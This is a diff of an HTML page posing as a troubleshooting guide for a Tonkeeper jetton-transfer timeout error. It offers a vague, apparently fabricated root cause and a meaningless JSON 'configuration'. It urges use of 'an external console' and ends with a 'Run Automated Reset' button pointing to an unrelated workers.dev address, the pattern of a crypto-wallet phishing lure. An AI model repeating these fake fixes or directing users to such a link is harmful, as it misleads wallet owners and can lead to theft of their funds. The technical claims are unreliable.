@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -45,23 +45,27 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a synchronization issue between the Tonkeeper wallet and the TON blockchain, causing the transfer loop to timeout and fail to complete.</li>
+<li>The error occurs due to a timing mismatch between the Tonkeeper wallet and the TON blockchain, causing the transfer loop to exceed the maximum allowed timeout period.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the TON blockchain for any ongoing maintenance or issues that may be causing the synchronization problem.</li>
-<li>Verify that the Tonkeeper wallet is updated to the latest version and configured correctly.</li>
-<li>Use the following command to reset the Tonkeeper wallet's cache:</li>
+<li>Increase the timeout threshold manually using the Tonkeeper API.</li>
+<li>Verify the wallet's clock synchronization with the TON blockchain to ensure accurate timing.</li>
+<li>Utilize the following JSON configuration to adjust the transfer loop settings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>config<span class="w"> </span>reset
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;transfer_loop_delay&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5000</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p>Consider utilizing an external console for advanced troubleshooting and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonkeeper wallet installed and configured on the user's device</li>
-<li>TON blockchain wallet and account set up</li>
-<li>Basic understanding of TON ecosystem and jetton transfers</li>
+<li>Tonkeeper wallet installed and configured correctly</li>
+<li>Basic understanding of TON blockchain and jetton transfer mechanics</li>
+<li>Access to the Tonkeeper API documentation and developer tools</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
